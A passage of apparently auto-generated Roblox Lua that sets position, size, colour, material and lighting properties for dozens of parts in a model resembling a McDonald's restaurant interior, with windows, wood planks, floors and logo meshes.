        Part490.Position = Vector3.new(-17.350004196166992, 11869.650390625, 5.600010871887207)
        Part490.Rotation = Vector3.new(0, 90, 0)
        Part490.Color = Color3.new(1, 0, 0)
        Part490.Size = Vector3.new(15, 9, 0.10000000149011612)
        Part490.Anchored = true
        Part490.BottomSurface = Enum.SurfaceType.Smooth
        Part490.BrickColor = BrickColor.new("Really red")
        Part490.Material = Enum.Material.SmoothPlastic
        Part490.TopSurface = Enum.SurfaceType.Smooth
        Part490.brickColor = BrickColor.new("Really red")
        Part491.Parent = Model0
        Part491.CFrame = CFrame.new(-14.4500027, 11863.1006, -3.59999752, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part491.Position = Vector3.new(-14.450002670288086, 11863.1005859375, -3.5999975204467773)
        Part491.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part491.Size = Vector3.new(0.09999990463256836, 0.09999996423721313, 3)
        Part491.Anchored = true
        Part491.BottomSurface = Enum.SurfaceType.Smooth
        Part491.BrickColor = BrickColor.new("Really black")
        Part491.Material = Enum.Material.SmoothPlastic
        Part491.TopSurface = Enum.SurfaceType.Smooth
        Part491.brickColor = BrickColor.new("Really black")
        Part492.Parent = Model0
        Part492.CFrame = CFrame.new(-14.4500027, 11863.1006, -6.8000021, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part492.Position = Vector3.new(-14.450002670288086, 11863.1005859375, -6.800002098083496)
        Part492.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part492.Size = Vector3.new(0.09999990463256836, 0.09999996423721313, 3)
        Part492.Anchored = true
        Part492.BottomSurface = Enum.SurfaceType.Smooth
        Part492.BrickColor = BrickColor.new("Really black")
        Part492.Material = Enum.Material.SmoothPlastic
        Part492.TopSurface = Enum.SurfaceType.Smooth
        Part492.brickColor = BrickColor.new("Really black")
        Part493.Parent = Model0
        Part493.CFrame = CFrame.new(6.4499979, 11859.2998, 13.0500116, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part493.Position = Vector3.new(6.449997901916504, 11859.2998046875, 13.05001163482666)
        Part493.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part493.Size = Vector3.new(12.89999771118164, 10.699999809265137, 0.10000000149011612)
        Part493.Anchored = true
        Part493.BottomSurface = Enum.SurfaceType.Smooth
        Part493.BrickColor = BrickColor.new("White")
        Part493.Material = Enum.Material.Wood
        Part493.TopSurface = Enum.SurfaceType.Smooth
        Part493.brickColor = BrickColor.new("White")
        Part494.Name = "Light"
        Part494.Parent = Model0
        Part494.CFrame = CFrame.new(2.79999352, 11864.1504, 5.80000782, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part494.Position = Vector3.new(2.7999935150146484, 11864.150390625, 5.8000078201293945)
        Part494.Color = Color3.new(0.960784, 0.803922, 0.188235)
        Part494.Transparency = 1
        Part494.Size = Vector3.new(1, 1, 1)
        Part494.Anchored = true
        Part494.BottomSurface = Enum.SurfaceType.Smooth
        Part494.BrickColor = BrickColor.new("Bright yellow")
        Part494.Material = Enum.Material.ForceField
        Part494.TopSurface = Enum.SurfaceType.Smooth
        Part494.brickColor = BrickColor.new("Bright yellow")
        PointLight495.Parent = Part494
        PointLight495.Range = 20
        PointLight495.Shadows = true
        Part496.Parent = Model0
        Part496.CFrame = CFrame.new(11.8999968, 11857.6006, 11.4000139, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part496.Orientation = Vector3.new(0, -90, 0)
        Part496.Position = Vector3.new(11.899996757507324, 11857.6005859375, 11.40001392364502)
        Part496.Rotation = Vector3.new(0, -90, 0)
        Part496.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part496.Size = Vector3.new(3.1999998092651367, 0.09999996423721313, 2.200000047683716)
        Part496.Anchored = true
        Part496.BottomSurface = Enum.SurfaceType.Smooth
        Part496.BrickColor = BrickColor.new("Really black")
        Part496.Material = Enum.Material.SmoothPlastic
        Part496.TopSurface = Enum.SurfaceType.Smooth
        Part496.brickColor = BrickColor.new("Really black")
        Part497.Name = "Light"
        Part497.Parent = Model0
        Part497.CFrame = CFrame.new(-17.4000034, 11861.251, -25, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part497.Position = Vector3.new(-17.40000343322754, 11861.2509765625, -25)
        Part497.Color = Color3.new(0.960784, 0.803922, 0.188235)
        Part497.Transparency = 1
        Part497.Size = Vector3.new(1, 1, 1)
        Part497.Anchored = true
        Part497.BottomSurface = Enum.SurfaceType.Smooth
        Part497.BrickColor = BrickColor.new("Bright yellow")
        Part497.Material = Enum.Material.ForceField
        Part497.TopSurface = Enum.SurfaceType.Smooth
        Part497.brickColor = BrickColor.new("Bright yellow")
        PointLight498.Parent = Part497
        PointLight498.Range = 20
        PointLight498.Shadows = true
        Part499.Name = "Light"
        Part499.Parent = Model0
        Part499.CFrame = CFrame.new(-14.8000011, 11868.1504, -18, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part499.Position = Vector3.new(-14.80000114440918, 11868.150390625, -18)
        Part499.Color = Color3.new(0.960784, 0.803922, 0.188235)
        Part499.Transparency = 1
        Part499.Size = Vector3.new(1, 1, 1)
        Part499.Anchored = true
        Part499.BottomSurface = Enum.SurfaceType.Smooth
        Part499.BrickColor = BrickColor.new("Bright yellow")
        Part499.Material = Enum.Material.ForceField
        Part499.TopSurface = Enum.SurfaceType.Smooth
        Part499.brickColor = BrickColor.new("Bright yellow")
        PointLight500.Parent = Part499
        PointLight500.Range = 20
        PointLight500.Shadows = true
        MeshPart501.Name = "McDonalds Text Logo"
        MeshPart501.Parent = Model0
        MeshPart501.CFrame = CFrame.new(-14.8000011, 11868.3467, -17.0390091, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        MeshPart501.Orientation = Vector3.new(0, 90, 0)
        MeshPart501.Position = Vector3.new(-14.80000114440918, 11868.3466796875, -17.03900909423828)
        MeshPart501.Rotation = Vector3.new(0, 90, 0)
        MeshPart501.Color = Color3.new(0.972549, 0.972549, 0.972549)
        MeshPart501.Size = Vector3.new(19.077999114990234, 2.4079999923706055, 0.20000000298023224)
        MeshPart501.Anchored = true
        MeshPart501.BrickColor = BrickColor.new("Institutional white")
        MeshPart501.Material = Enum.Material.SmoothPlastic
        MeshPart501.brickColor = BrickColor.new("Institutional white")
        MeshPart502.Name = "McCafe Logo"
        MeshPart502.Parent = Model0
        MeshPart502.CFrame = CFrame.new(-17.1499958, 11860.8799, -25.1000061, 0, -1, 0, 0, 0, 1, -1, 0, 0)
        MeshPart502.Orientation = Vector3.new(-90, 90, 0)
        MeshPart502.Position = Vector3.new(-17.149995803833008, 11860.8798828125, -25.100006103515625)
        MeshPart502.Rotation = Vector3.new(-90, 0, 90)
        MeshPart502.Color = Color3.new(0.972549, 0.972549, 0.972549)
        MeshPart502.Size = Vector3.new(6, 0.10000000149011612, 2.859999895095825)
        MeshPart502.Anchored = true
        MeshPart502.BrickColor = BrickColor.new("Institutional white")
        MeshPart502.brickColor = BrickColor.new("Institutional white")
        Part503.Parent = Model0
        Part503.CFrame = CFrame.new(-14.4499989, 11857.5498, -19.0999832, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part503.Position = Vector3.new(-14.44999885559082, 11857.5498046875, -19.09998321533203)
        Part503.Color = Color3.new(0.929412, 0.917647, 0.917647)
        Part503.Size = Vector3.new(0.09999990463256836, 0.19999995827674866, 1.9999990463256836)
        Part503.Anchored = true
        Part503.BottomSurface = Enum.SurfaceType.Smooth
        Part503.BrickColor = BrickColor.new("Lily white")
        Part503.Material = Enum.Material.Wood
        Part503.TopSurface = Enum.SurfaceType.Smooth
        Part503.brickColor = BrickColor.new("Lily white")
        Part504.Name = "Floor"
        Part504.Parent = Model0
        Part504.CFrame = CFrame.new(2.99999428, 11853.9004, -8.54999447, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part504.Position = Vector3.new(2.9999942779541016, 11853.900390625, -8.549994468688965)
        Part504.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part504.Size = Vector3.new(20, 0.10000000149011612, 43.29999923706055)
        Part504.Anchored = true
        Part504.BottomSurface = Enum.SurfaceType.Smooth
        Part504.BrickColor = BrickColor.new("White")
        Part504.Material = Enum.Material.SmoothPlastic
        Part504.TopSurface = Enum.SurfaceType.Smooth
        Part504.brickColor = BrickColor.new("White")
        Texture505.Parent = Part504
        Texture505.Texture = "rbxassetid://4224711125"
        Texture505.Face = Enum.NormalId.Top
        Texture505.Color3 = Color3.new(0.831373, 0.831373, 0.831373)
        Texture505.StudsPerTileU = 5.5
        Texture505.StudsPerTileV = 5.5
        Part506.Name = "Floor"
        Part506.Parent = Model0
        Part506.CFrame = CFrame.new(-12.0000057, 11853.9004, -24.1499939, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part506.Position = Vector3.new(-12.000005722045898, 11853.900390625, -24.149993896484375)
        Part506.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part506.Size = Vector3.new(9.999998092651367, 0.10000000149011612, 12.099998474121094)
        Part506.Anchored = true
        Part506.BottomSurface = Enum.SurfaceType.Smooth
        Part506.BrickColor = BrickColor.new("White")
        Part506.Material = Enum.Material.SmoothPlastic
        Part506.TopSurface = Enum.SurfaceType.Smooth
        Part506.brickColor = BrickColor.new("White")
        Texture507.Parent = Part506
        Texture507.Texture = "rbxassetid://4224711125"
        Texture507.Face = Enum.NormalId.Top
        Texture507.Color3 = Color3.new(0.831373, 0.831373, 0.831373)
        Texture507.StudsPerTileU = 5.5
        Texture507.StudsPerTileV = 5.5
        Part508.Parent = Model0
        Part508.CFrame = CFrame.new(-11.9500027, 11861.1504, -30.0499916, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part508.Position = Vector3.new(-11.950002670288086, 11861.150390625, -30.049991607666016)
        Part508.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part508.Size = Vector3.new(9.699999809265137, 7, 0.10000000149011612)
        Part508.Anchored = true
        Part508.BottomSurface = Enum.SurfaceType.Smooth
        Part508.BrickColor = BrickColor.new("Really black")
        Part508.Material = Enum.Material.SmoothPlastic
        Part508.TopSurface = Enum.SurfaceType.Smooth
        Part508.brickColor = BrickColor.new("Really black")
        Part509.Name = "Wood Plank"
        Part509.Parent = Model0
        Part509.CFrame = CFrame.new(-12.1000004, 11857.8506, -30.1999931, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part509.Orientation = Vector3.new(0, -90, 0)
        Part509.Position = Vector3.new(-12.100000381469727, 11857.8505859375, -30.199993133544922)
        Part509.Rotation = Vector3.new(0, -90, 0)
        Part509.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part509.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part509.Anchored = true
        Part509.BottomSurface = Enum.SurfaceType.Smooth
        Part509.BrickColor = BrickColor.new("Burnt Sienna")
        Part509.Material = Enum.Material.Wood
        Part509.TopSurface = Enum.SurfaceType.Smooth
        Part509.brickColor = BrickColor.new("Burnt Sienna")
        Part510.Name = "Wood Plank"
        Part510.Parent = Model0
        Part510.CFrame = CFrame.new(-12.1000004, 11858.3506, -30.1999931, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part510.Orientation = Vector3.new(0, -90, 0)
        Part510.Position = Vector3.new(-12.100000381469727, 11858.3505859375, -30.199993133544922)
        Part510.Rotation = Vector3.new(0, -90, 0)
        Part510.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part510.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part510.Anchored = true
        Part510.BottomSurface = Enum.SurfaceType.Smooth
        Part510.BrickColor = BrickColor.new("Burnt Sienna")
        Part510.Material = Enum.Material.Wood
        Part510.TopSurface = Enum.SurfaceType.Smooth
        Part510.brickColor = BrickColor.new("Burnt Sienna")
        Part511.Name = "Wood Plank"
        Part511.Parent = Model0
        Part511.CFrame = CFrame.new(-12.1000004, 11858.8506, -30.1999931, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part511.Orientation = Vector3.new(0, -90, 0)
        Part511.Position = Vector3.new(-12.100000381469727, 11858.8505859375, -30.199993133544922)
        Part511.Rotation = Vector3.new(0, -90, 0)
        Part511.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part511.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part511.Anchored = true
        Part511.BottomSurface = Enum.SurfaceType.Smooth
        Part511.BrickColor = BrickColor.new("Burnt Sienna")
        Part511.Material = Enum.Material.Wood
        Part511.TopSurface = Enum.SurfaceType.Smooth
        Part511.brickColor = BrickColor.new("Burnt Sienna")
        Part512.Name = "Wood Plank"
        Part512.Parent = Model0
        Part512.CFrame = CFrame.new(-12.1000004, 11859.3506, -30.1999931, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part512.Orientation = Vector3.new(0, -90, 0)
        Part512.Position = Vector3.new(-12.100000381469727, 11859.3505859375, -30.199993133544922)
        Part512.Rotation = Vector3.new(0, -90, 0)
        Part512.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part512.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part512.Anchored = true
        Part512.BottomSurface = Enum.SurfaceType.Smooth
        Part512.BrickColor = BrickColor.new("Burnt Sienna")
        Part512.Material = Enum.Material.Wood
        Part512.TopSurface = Enum.SurfaceType.Smooth
        Part512.brickColor = BrickColor.new("Burnt Sienna")
        Part513.Name = "Wood Plank"
        Part513.Parent = Model0
        Part513.CFrame = CFrame.new(-12.1000004, 11859.8506, -30.1999931, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part513.Orientation = Vector3.new(0, -90, 0)
        Part513.Position = Vector3.new(-12.100000381469727, 11859.8505859375, -30.199993133544922)
        Part513.Rotation = Vector3.new(0, -90, 0)
        Part513.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part513.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part513.Anchored = true
        Part513.BottomSurface = Enum.SurfaceType.Smooth
        Part513.BrickColor = BrickColor.new("Burnt Sienna")
        Part513.Material = Enum.Material.Wood
        Part513.TopSurface = Enum.SurfaceType.Smooth
        Part513.brickColor = BrickColor.new("Burnt Sienna")
        Part514.Name = "Wood Plank"
        Part514.Parent = Model0
        Part514.CFrame = CFrame.new(-12.1000004, 11860.3506, -30.1999931, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part514.Orientation = Vector3.new(0, -90, 0)
        Part514.Position = Vector3.new(-12.100000381469727, 11860.3505859375, -30.199993133544922)
        Part514.Rotation = Vector3.new(0, -90, 0)
        Part514.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part514.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part514.Anchored = true
        Part514.BottomSurface = Enum.SurfaceType.Smooth
        Part514.BrickColor = BrickColor.new("Burnt Sienna")
        Part514.Material = Enum.Material.Wood
        Part514.TopSurface = Enum.SurfaceType.Smooth
        Part514.brickColor = BrickColor.new("Burnt Sienna")
        Part515.Name = "Wood Plank"
        Part515.Parent = Model0
        Part515.CFrame = CFrame.new(-12.1000004, 11860.8506, -30.1999931, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part515.Orientation = Vector3.new(0, -90, 0)
        Part515.Position = Vector3.new(-12.100000381469727, 11860.8505859375, -30.199993133544922)
        Part515.Rotation = Vector3.new(0, -90, 0)
        Part515.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part515.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part515.Anchored = true
        Part515.BottomSurface = Enum.SurfaceType.Smooth
        Part515.BrickColor = BrickColor.new("Burnt Sienna")
        Part515.Material = Enum.Material.Wood
        Part515.TopSurface = Enum.SurfaceType.Smooth
        Part515.brickColor = BrickColor.new("Burnt Sienna")
        Part516.Name = "Wood Plank"
        Part516.Parent = Model0
        Part516.CFrame = CFrame.new(-12.1000004, 11861.3506, -30.1999931, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part516.Orientation = Vector3.new(0, -90, 0)
        Part516.Position = Vector3.new(-12.100000381469727, 11861.3505859375, -30.199993133544922)
        Part516.Rotation = Vector3.new(0, -90, 0)
        Part516.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part516.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part516.Anchored = true
        Part516.BottomSurface = Enum.SurfaceType.Smooth
        Part516.BrickColor = BrickColor.new("Burnt Sienna")
        Part516.Material = Enum.Material.Wood
        Part516.TopSurface = Enum.SurfaceType.Smooth
        Part516.brickColor = BrickColor.new("Burnt Sienna")
        Part517.Name = "Wood Plank"
        Part517.Parent = Model0
        Part517.CFrame = CFrame.new(-12.1000004, 11861.8506, -30.1999931, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part517.Orientation = Vector3.new(0, -90, 0)
        Part517.Position = Vector3.new(-12.100000381469727, 11861.8505859375, -30.199993133544922)
        Part517.Rotation = Vector3.new(0, -90, 0)
        Part517.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part517.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part517.Anchored = true
        Part517.BottomSurface = Enum.SurfaceType.Smooth
        Part517.BrickColor = BrickColor.new("Burnt Sienna")
        Part517.Material = Enum.Material.Wood
        Part517.TopSurface = Enum.SurfaceType.Smooth
        Part517.brickColor = BrickColor.new("Burnt Sienna")
        Part518.Parent = Model0
        Part518.CFrame = CFrame.new(-14.4999981, 11868.6504, -15.9000006, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part518.Position = Vector3.new(-14.499998092651367, 11868.650390625, -15.90000057220459)
        Part518.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part518.Size = Vector3.new(0.19999989867210388, 1, 28)
        Part518.Anchored = true
        Part518.BottomSurface = Enum.SurfaceType.Smooth
        Part518.BrickColor = BrickColor.new("Dark stone grey")
        Part518.Material = Enum.Material.SmoothPlastic
        Part518.TopSurface = Enum.SurfaceType.Smooth
        Part518.brickColor = BrickColor.new("Dark stone grey")
        Part519.Parent = Model0
        Part519.CFrame = CFrame.new(-14.4999981, 11867.6504, -15.9000006, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part519.Position = Vector3.new(-14.499998092651367, 11867.650390625, -15.90000057220459)
        Part519.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part519.Size = Vector3.new(0.19999989867210388, 1, 28)
        Part519.Anchored = true
        Part519.BottomSurface = Enum.SurfaceType.Smooth
        Part519.BrickColor = BrickColor.new("Dark stone grey")
        Part519.Material = Enum.Material.SmoothPlastic
        Part519.TopSurface = Enum.SurfaceType.Smooth
        Part519.brickColor = BrickColor.new("Dark stone grey")
        Part520.Parent = Model0
        Part520.CFrame = CFrame.new(-14.4499989, 11866.6504, -15.9000006, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part520.Position = Vector3.new(-14.44999885559082, 11866.650390625, -15.90000057220459)
        Part520.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part520.Size = Vector3.new(0.09999990463256836, 1, 28)
        Part520.Anchored = true
        Part520.BottomSurface = Enum.SurfaceType.Smooth
        Part520.BrickColor = BrickColor.new("Dark stone grey")
        Part520.Material = Enum.Material.SmoothPlastic
        Part520.TopSurface = Enum.SurfaceType.Smooth
        Part520.brickColor = BrickColor.new("Dark stone grey")
        Part521.Parent = Model0
        Part521.CFrame = CFrame.new(-14.4999981, 11865.6504, -15.9000006, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part521.Position = Vector3.new(-14.499998092651367, 11865.650390625, -15.90000057220459)
        Part521.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part521.Size = Vector3.new(0.19999989867210388, 1, 28)
        Part521.Anchored = true
        Part521.BottomSurface = Enum.SurfaceType.Smooth
        Part521.BrickColor = BrickColor.new("Dark stone grey")
        Part521.Material = Enum.Material.SmoothPlastic
        Part521.TopSurface = Enum.SurfaceType.Smooth
        Part521.brickColor = BrickColor.new("Dark stone grey")
        Part522.Parent = Model0
        Part522.CFrame = CFrame.new(-12.5500011, 11864.9004, -11.8499975, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part522.Position = Vector3.new(-12.55000114440918, 11864.900390625, -11.849997520446777)
        Part522.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part522.Size = Vector3.new(11.5, 0.4999999701976776, 43.900001525878906)
        Part522.Anchored = true
        Part522.BottomSurface = Enum.SurfaceType.Smooth
        Part522.BrickColor = BrickColor.new("White")
        Part522.Material = Enum.Material.SmoothPlastic
        Part522.TopSurface = Enum.SurfaceType.Smooth
        Part522.brickColor = BrickColor.new("White")
        Part523.Name = "Wood Plank"
        Part523.Parent = Model0
        Part523.CFrame = CFrame.new(-17.0000019, 11863.8506, -25.0999985, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part523.Position = Vector3.new(-17.000001907348633, 11863.8505859375, -25.099998474121094)
        Part523.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part523.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part523.Anchored = true
        Part523.BottomSurface = Enum.SurfaceType.Smooth
        Part523.BrickColor = BrickColor.new("Burnt Sienna")
        Part523.Material = Enum.Material.Wood
        Part523.TopSurface = Enum.SurfaceType.Smooth
        Part523.brickColor = BrickColor.new("Burnt Sienna")
        Part524.Name = "Wood Plank"
        Part524.Parent = Model0
        Part524.CFrame = CFrame.new(-17.0000019, 11863.3506, -25.0999985, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part524.Position = Vector3.new(-17.000001907348633, 11863.3505859375, -25.099998474121094)
        Part524.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part524.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part524.Anchored = true
        Part524.BottomSurface = Enum.SurfaceType.Smooth
        Part524.BrickColor = BrickColor.new("Burnt Sienna")
        Part524.Material = Enum.Material.Wood
        Part524.TopSurface = Enum.SurfaceType.Smooth
        Part524.brickColor = BrickColor.new("Burnt Sienna")
        Part525.Name = "Wood Plank"
        Part525.Parent = Model0
        Part525.CFrame = CFrame.new(-17.0000019, 11864.3506, -25.0999985, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part525.Position = Vector3.new(-17.000001907348633, 11864.3505859375, -25.099998474121094)
        Part525.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part525.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part525.Anchored = true
        Part525.BottomSurface = Enum.SurfaceType.Smooth
        Part525.BrickColor = BrickColor.new("Burnt Sienna")
        Part525.Material = Enum.Material.Wood
        Part525.TopSurface = Enum.SurfaceType.Smooth
        Part525.brickColor = BrickColor.new("Burnt Sienna")
        Part526.Parent = Model0
        Part526.CFrame = CFrame.new(-14.4500027, 11863.9004, -9.99999142, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part526.Position = Vector3.new(-14.450002670288086, 11863.900390625, -9.999991416931152)
        Part526.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part526.Size = Vector3.new(0.09999990463256836, 1.5, 16.200000762939453)
        Part526.Anchored = true
        Part526.BottomSurface = Enum.SurfaceType.Smooth
        Part526.BrickColor = BrickColor.new("White")
        Part526.Material = Enum.Material.SmoothPlastic
        Part526.TopSurface = Enum.SurfaceType.Smooth
        Part526.brickColor = BrickColor.new("White")
        Part527.Name = "Window"
        Part527.Parent = Model0
        Part527.CFrame = CFrame.new(-14.4500027, 11859.6504, -13.199996, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part527.Position = Vector3.new(-14.450002670288086, 11859.650390625, -13.199995994567871)
        Part527.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part527.Transparency = 0.4000000059604645
        Part527.Size = Vector3.new(0.09999990463256836, 6.800000190734863, 3)
        Part527.Anchored = true
        Part527.BottomSurface = Enum.SurfaceType.Smooth
        Part527.BrickColor = BrickColor.new("White")
        Part527.Material = Enum.Material.Glass
        Part527.TopSurface = Enum.SurfaceType.Smooth
        Part527.brickColor = BrickColor.new("White")
        Part528.Name = "Window"
        Part528.Parent = Model0
        Part528.CFrame = CFrame.new(-14.4500027, 11859.6504, -16.3999939, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part528.Position = Vector3.new(-14.450002670288086, 11859.650390625, -16.399993896484375)
        Part528.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part528.Transparency = 0.4000000059604645
        Part528.Size = Vector3.new(0.09999990463256836, 6.800000190734863, 3)
        Part528.Anchored = true
        Part528.BottomSurface = Enum.SurfaceType.Smooth
        Part528.BrickColor = BrickColor.new("White")
        Part528.Material = Enum.Material.Glass
        Part528.TopSurface = Enum.SurfaceType.Smooth
        Part528.brickColor = BrickColor.new("White")
        Part529.Parent = Model0
        Part529.CFrame = CFrame.new(-14.4500027, 11863.1006, -9.99999905, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part529.Position = Vector3.new(-14.450002670288086, 11863.1005859375, -9.999999046325684)
        Part529.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part529.Size = Vector3.new(0.09999990463256836, 0.09999996423721313, 3)
        Part529.Anchored = true
        Part529.BottomSurface = Enum.SurfaceType.Smooth
        Part529.BrickColor = BrickColor.new("Really black")
        Part529.Material = Enum.Material.SmoothPlastic
        Part529.TopSurface = Enum.SurfaceType.Smooth
        Part529.brickColor = BrickColor.new("Really black")
        Part530.Parent = Model0
        Part530.CFrame = CFrame.new(-14.4500065, 11859.6504, -11.5999975, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part530.Position = Vector3.new(-14.450006484985352, 11859.650390625, -11.599997520446777)
        Part530.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part530.Size = Vector3.new(0.09999990463256836, 7, 0.19999998807907104)
        Part530.Anchored = true
        Part530.BottomSurface = Enum.SurfaceType.Smooth
        Part530.BrickColor = BrickColor.new("Really black")
        Part530.Material = Enum.Material.SmoothPlastic
        Part530.TopSurface = Enum.SurfaceType.Smooth
        Part530.brickColor = BrickColor.new("Really black")
        Part531.Parent = Model0
        Part531.CFrame = CFrame.new(-14.4500027, 11863.1006, -13.199996, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part531.Position = Vector3.new(-14.450002670288086, 11863.1005859375, -13.199995994567871)
        Part531.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part531.Size = Vector3.new(0.09999990463256836, 0.09999996423721313, 3)
        Part531.Anchored = true
        Part531.BottomSurface = Enum.SurfaceType.Smooth
        Part531.BrickColor = BrickColor.new("Really black")
        Part531.Material = Enum.Material.SmoothPlastic
        Part531.TopSurface = Enum.SurfaceType.Smooth
        Part531.brickColor = BrickColor.new("Really black")
        Part532.Parent = Model0
        Part532.CFrame = CFrame.new(-14.4500027, 11863.1006, -16.3999939, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part532.Position = Vector3.new(-14.450002670288086, 11863.1005859375, -16.399993896484375)
        Part532.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part532.Size = Vector3.new(0.09999990463256836, 0.09999996423721313, 3)
        Part532.Anchored = true
        Part532.BottomSurface = Enum.SurfaceType.Smooth
        Part532.BrickColor = BrickColor.new("Really black")
        Part532.Material = Enum.Material.SmoothPlastic
        Part532.TopSurface = Enum.SurfaceType.Smooth
        Part532.brickColor = BrickColor.new("Really black")
        Part533.Parent = Model0
        Part533.CFrame = CFrame.new(-14.4500065, 11859.6504, -14.7999945, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part533.Position = Vector3.new(-14.450006484985352, 11859.650390625, -14.799994468688965)
        Part533.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part533.Size = Vector3.new(0.09999990463256836, 7, 0.19999998807907104)
        Part533.Anchored = true
        Part533.BottomSurface = Enum.SurfaceType.Smooth
        Part533.BrickColor = BrickColor.new("Really black")
        Part533.Material = Enum.Material.SmoothPlastic
        Part533.TopSurface = Enum.SurfaceType.Smooth
        Part533.brickColor = BrickColor.new("Really black")
        Part534.Parent = Model0
        Part534.CFrame = CFrame.new(-14.4500065, 11859.6504, -17.9999924, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part534.Position = Vector3.new(-14.450006484985352, 11859.650390625, -17.99999237060547)
        Part534.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part534.Size = Vector3.new(0.09999990463256836, 7, 0.19999998807907104)
        Part534.Anchored = true
        Part534.BottomSurface = Enum.SurfaceType.Smooth
        Part534.BrickColor = BrickColor.new("Really black")
        Part534.Material = Enum.Material.SmoothPlastic
        Part534.TopSurface = Enum.SurfaceType.Smooth
        Part534.brickColor = BrickColor.new("Really black")
        Part535.Parent = Model0
        Part535.CFrame = CFrame.new(-15.7000027, 11861.1504, -19.1499939, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part535.Position = Vector3.new(-15.700002670288086, 11861.150390625, -19.149993896484375)
        Part535.Color = Color3.new(0.905882, 0.905882, 0.92549)
        Part535.Size = Vector3.new(2.5999999046325684, 7, 0.6999999284744263)
        Part535.Anchored = true
        Part535.BottomSurface = Enum.SurfaceType.Smooth
        Part535.BrickColor = BrickColor.new("Pearl")
        Part535.Material = Enum.Material.SmoothPlastic
        Part535.TopSurface = Enum.SurfaceType.Smooth
        Part535.brickColor = BrickColor.new("Pearl")
        Part536.Parent = Model0
        Part536.CFrame = CFrame.new(-15.7500019, 11861.1504, -18.4499969, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part536.Position = Vector3.new(-15.750001907348633, 11861.150390625, -18.449996948242188)
        Part536.Color = Color3.new(0.94902, 0.952941, 0.952941)
